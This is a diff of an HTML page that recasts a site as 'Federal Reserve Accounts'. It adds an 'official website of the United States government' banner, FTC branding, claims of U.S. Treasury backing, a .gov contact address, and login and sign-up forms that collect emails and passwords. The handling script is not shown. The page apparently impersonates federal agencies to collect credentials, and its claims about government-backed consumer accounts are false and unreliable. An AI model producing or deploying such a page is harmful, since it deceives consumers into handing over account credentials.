@@ -1,128 +1,222 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Safeguard Accounts</title>
-  <link rel="stylesheet" href="style.css">
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Federal Reserve Accounts</title>
+  <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-
   <!-- Top Banner -->
   <div class="top-banner">
-    <img src="images/flag.png" alt="US Flag">
-    <span>An official website of the United States government</span>
+    <img src="images/flag.png" alt="US Flag" />
+    <span class="banner-text">An official website of the United States government</span>
   </div>
 
   <!-- Header -->
-  <header>
-    <img src="images/header-ftc.png" alt="FTC Header" class="header-logo">
+  <header class="site-header">
+    <img src="images/header-ftc.png" alt="FTC Header" class="header-logo" />
   </header>
 
-  <!-- Navigation -->
-  <nav>
-    <div class="nav-container">
-      <div class="logo">
-        <a href="index.html">Safeguard Accounts</a>
-      </div>
-      <div class="menu-toggle" id="menu-toggle">☰</div>
+  <!-- NAV: left shows date, right has links/buttons -->
+  <nav class="nav-bar">
+    <div class="nav-left">
+      <span id="currentDate"></span>
+    </div>
+    <div class="nav-right">
       <ul id="nav-links">
         <li><a href="policies.html">Policies</a></li>
         <li><a href="report-fraud.html">Report Fraud</a></li>
         <li><a href="#about-ftc">About the FTC</a></li>
         <li><a href="#" id="login-link">Login</a></li>
         <li><a href="#" id="signup-link">Sign Up</a></li>
-        <li><a href="#contact">Contact Us</a></li>
+        <li><a href="#take-action">Take Action</a></li>
+        <li><a href="#contact">Contact</a></li>
       </ul>
+      <div class="menu-toggle" id="menu-toggle">☰</div>
     </div>
   </nav>
 
-  <!-- Main Content -->
-  <main id="about">
-    <section>
-      <h2>Welcome to Safeguard Accounts</h2>
-      <p>
-        At Safeguard Accounts, we are dedicated to protecting your financial identity 
-        and ensuring your banking experience is safe, transparent, and reliable.
-      </p>
-    </section>
-
-    <section>
-      <h2>Our Mission</h2>
-      <p>
-        Our mission is simple: <strong>to protect consumers in the United States</strong> 
-        by providing secure federal accounts backed by oversight and accountability.
-      </p>
-    </section>
-
-    <!-- Take Action Section -->
-    <section id="take-action">
-      <h2>Take Action</h2>
-      <div class="action-grid">
-        <a href="report-fraud.html" class="action-btn">⚠️ Report Fraud</a>
-        <a href="submit-comment.html" class="action-btn">✍️ Submit a Public Comment</a>
-        <a href="merger-comment.html" class="action-btn">📄 Merger/Antitrust Comment</a>
-        <a href="free-credit.html" class="action-btn">💲 Get Free Credit Report</a>
-        <a href="report-identity.html" class="action-btn">🪪 Report Identity Theft</a>
-        <a href="donotcall.html" class="action-btn">🚫 Do Not Call Registry</a>
+  <main>
+    <!-- Welcome -->
+    <section class="hero">
+      <h1>Welcome to Federal Reserve Accounts</h1>
+      <div class="hero-content">
+        <p>
+          Federal Reserve Accounts provide secure, government-backed financial
+          accounts for eligible consumers. Our platform combines federal oversight,
+          robust fraud prevention, and transparent account policies to protect your
+          money and identity. Whether you're checking balances, viewing statements,
+          or reporting suspicious activity, our systems are designed to keep your
+          finances safe and accessible.
+        </p>
+        <p>
+          We provide easy-to-use online tools for day-to-day banking, proactive
+          security alerts that notify you of suspicious activity, and dedicated
+          support specialists who can assist with recovery and dispute resolution.
+          Our approach is to combine modern security technology with clear
+          consumer protections to ensure every user understands their rights and
+          options.
+        </p>
+        <p>
+          Through continuous audits, encrypted data storage, and real-time monitoring,
+          Federal Reserve Accounts aim to deliver the reliability and trust you expect
+          from a government-backed financial service.
+        </p>
       </div>
     </section>
 
-    <!-- Why Choose Section -->
-    <section>
-      <h2>Why Choose Safeguard Accounts?</h2>
+    <!-- Mission -->
+    <section class="mission">
+      <h2>Our Mission</h2>
+      <p>
+        At Federal Reserve Accounts, our mission is to provide secure and equitable
+        access to basic federal financial services. We work to ensure that all
+        account holders receive protections against fraud, clear disclosures about
+        fees and terms, and access to dispute and recovery processes when problems
+        arise.
+      </p>
+      <p>
+        We partner with federal regulators and consumer protection agencies to keep
+        rules up-to-date and enforceable. We emphasize proactive monitoring,
+        easy reporting of suspicious activity, and rapid response teams to help you
+        restore accounts and correct records.
+      </p>
+      <p>
+        Our services support financial inclusion by providing secure onboarding,
+        identity verification, and recovery assistance for vulnerable consumers.
+      </p>
+      <p>
+        We maintain strict privacy controls and only share data under legal processes
+        or to protect account safety. Education and transparency are core to how we
+        operate—showing users how to safeguard themselves and how we keep their funds secure.
+      </p>
+    </section>
+
+    <!-- Take Action -->
+    <section id="take-action" class="take-action">
+      <h2>Take Action</h2>
+      <div class="action-grid">
+        <button class="action-btn" id="btn-report-fraud">⚠️ Report Fraud</button>
+        <button class="action-btn" id="btn-public-comment">✍️ Submit a Public Comment</button>
+        <button class="action-btn" id="btn-merger-comment">📄 Merger / Antitrust Comment</button>
+        <button class="action-btn" id="btn-free-credit">💲 Get Your Free Credit Report</button>
+        <button class="action-btn" id="btn-report-identity">🪪 Report Identity Theft</button>
+        <button class="action-btn" id="btn-dnc">🚫 Register for Do Not Call</button>
+      </div>
+    </section>
+
+    <!-- Why Choose -->
+    <section class="why-choose">
+      <h2>Why Choose Federal Reserve Accounts?</h2>
       <ul>
-        <li>✅ Comprehensive fraud monitoring and prevention</li>
-        <li>✅ User-friendly account management tools</li>
-        <li>✅ Backed by federal consumer protection guidelines</li>
-        <li>✅ 24/7 customer support</li>
-        <li>✅ Regular compliance checks and audits</li>
+        <li>Comprehensive fraud monitoring and prevention systems.</li>
+        <li>User-friendly account management and statement access.</li>
+        <li>Backed by federal consumer protection standards and oversight.</li>
+        <li>Transparent policies and rapid dispute resolution.</li>
+        <li>24/7 customer support and recovery assistance.</li>
       </ul>
     </section>
 
-    <!-- Security Section -->
-    <section>
+    <!-- Security You Can Trust -->
+    <section class="security">
       <h2>Security You Can Trust</h2>
       <p>
-        Safeguard Accounts uses encryption, multi-factor authentication, and advanced monitoring.
+        Federal Reserve Accounts are protected by industry-leading encryption,
+        enforced access controls, and continuous monitoring. The U.S. Treasury
+        Department provides institutional backing and oversight for the program,
+        ensuring that security standards are aligned with federal guidelines.
+      </p>
+      <p>
+        We use multi-factor authentication, behavior-based fraud detection,
+        and anomaly alerts to stop suspicious transactions before they become
+        problems. Our data centers are hosted within secure US-based facilities
+        with strict physical and network security controls.
+      </p>
+      <p>
+        Every transaction is logged and audited—this helps with fast forensic
+        investigations if an incident occurs. Additionally, independent compliance
+        reviews and third-party audits occur regularly to validate controls.
+      </p>
+      <p>
+        Account recovery includes step-by-step support from our specialists,
+        identity restoration services, and partners that help repair credit when
+        fraud occurs. Users receive clear guidance about steps to take and how
+        we coordinate with federal agencies on their behalf.
+      </p>
+      <p>
+        Your privacy is a priority. We collect only necessary data, limit access,
+        and follow strict retention rules. Data transfers (if any) comply with
+        U.S. federal requirements and are documented for transparency.
+      </p>
+      <p>
+        To summarize: Federal Reserve Accounts combine advanced technical safeguards,
+        professional support, and U.S. Treasury backing to deliver a secure,
+        reliable, government-supported financial option for consumers.
       </p>
     </section>
 
-    <!-- About FTC -->
-    <section id="about-ftc">
+    <!-- About FTC (expanded) -->
+    <section id="about-ftc" class="about-ftc">
       <h2>About the FTC</h2>
       <p>
-        The Federal Trade Commission (FTC) protects consumers and promotes competition.
+        The Federal Trade Commission (FTC) enforces consumer protection laws,
+        investigates unfair business practices, and educates Americans about
+        financial scams and consumer rights. The FTC works across the federal
+        government to ensure markets remain competitive and consumers are not
+        misled or defrauded.
+      </p>
+      <p>
+        The FTC handles complaints, conducts investigations, and when necessary,
+        pursues enforcement actions to stop deceptive business behavior. They
+        also provide resources to help victims of identity theft and financial
+        fraud recover.
+      </p>
+      <p>
+        The Commission publishes guidance, policy statements, and educational
+        resources designed to help consumers spot scams, secure their accounts,
+        and understand legal protections available to them.
+      </p>
+      <p>
+        The FTC collaborates with law enforcement partners, state regulators,
+        and industry groups to develop best practices and improve consumer
+        protections nationwide.
+      </p>
+      <p>
+        If there are systemic issues observed across many consumers—like a large
+        scale data breach or a deceptive practice—the FTC can pursue broad
+        corrective actions and restitution for affected individuals.
+      </p>
+      <p>
+        The FTC is a resource for both individuals and organizations seeking to
+        understand compliance responsibilities and how to protect consumers in
+        the digital economy.
       </p>
     </section>
+
+    <!-- Contact / Footer -->
+    <footer id="contact">
+      <h2>Contact Us</h2>
+      <form id="contactForm">
+        <textarea id="contactQuery" placeholder="Type your query here..." required></textarea><br />
+        <button type="submit">Click here to submit</button>
+        <p id="contactMessage"></p>
+      </form>
+      <p>Contact Us: support@federalreserveaccounts.gov | Phone: (123) 456-7890</p>
+      <p>&copy; 2025 Federal Reserve Accounts. All rights reserved.</p>
+    </footer>
   </main>
 
-  <!-- Contact Us + Footer -->
-  <footer id="contact">
-    <h2>Contact Us</h2>
-    <form id="contactForm">
-      <textarea id="contactQuery" placeholder="Type your query here..." required></textarea><br>
-      <button type="submit">Submit</button>
-      <p id="contactMessage"></p>
-    </form>
-    <p>Contact: support@safeguardaccounts.com | Phone: (123) 456-7890</p>
-    <p>&copy; 2025 Safeguard Accounts. All rights reserved.</p>
-  </footer>
-
-  <!-- Login Modal -->
-  <div id="login-modal" class="modal">
-    <div class="modal-content">
-      <span class="close" id="close-login">&times;</span>
-      <h2>Login</h2>
-      <form>
-        <label for="userId">User ID</label>
-        <input type="text" id="userId" required>
-        <label for="loginPassword">Password</label>
-        <input type="password" id="loginPassword" required>
-        <label>
-          <input type="checkbox" id="keepSignedIn"> Keep me signed in
-        </label>
-        <button type="submit">Login</button>
+  <!-- Modals -->
+  <!-- Public Comment Modal -->
+  <div id="publicCommentModal" class="modal">
+    <div class="modal-content small">
+      <span class="close" data-close="publicCommentModal">&times;</span>
+      <h3>Submit a Public Comment</h3>
+      <form id="publicCommentForm">
+        <textarea id="publicCommentText" placeholder="Type your comment here..." required></textarea>
+        <button type="submit">Submit Comment</button>
+        <p id="publicCommentMessage" class="modal-success"></p>
       </form>
     </div>
   </div>
@@ -130,21 +224,32 @@
   <!-- Sign Up Modal -->
   <div id="signup-modal" class="modal">
     <div class="modal-content">
-      <span class="close" id="close-signup">&times;</span>
+      <span class="close" data-close="signup-modal">&times;</span>
       <h2>Create Your Account</h2>
-      <form>
-        <label for="signupName">Full Name</label>
-        <input type="text" id="signupName" required>
-        <label for="signupEmail">Email</label>
-        <input type="email" id="signupEmail" required>
-        <label for="signupPassword">Password</label>
-        <input type="password" id="signupPassword" required>
+      <form id="signupForm">
+        <input id="name" placeholder="Full name" required />
+        <input id="email" type="email" placeholder="Email" required />
+        <input id="password" type="password" placeholder="Password" required />
         <button type="submit">Sign Up</button>
       </form>
     </div>
   </div>
 
-  <!-- JS -->
+  <!-- Login Modal -->
+  <div id="login-modal" class="modal">
+    <div class="modal-content">
+      <span id="close-login" class="close" data-close="login-modal">&times;</span>
+      <h2>Login</h2>
+      <form id="loginForm">
+        <input id="userId" type="email" placeholder="Email" required />
+        <input id="loginPassword" type="password" placeholder="Password" required />
+        <label><input id="keepSignedIn" type="checkbox" /> Keep me signed in</label>
+        <button type="submit">Login</button>
+      </form>
+    </div>
+  </div>
+
+  <!-- Script -->
   <script type="module" src="script.js"></script>
 </body>
 </html>
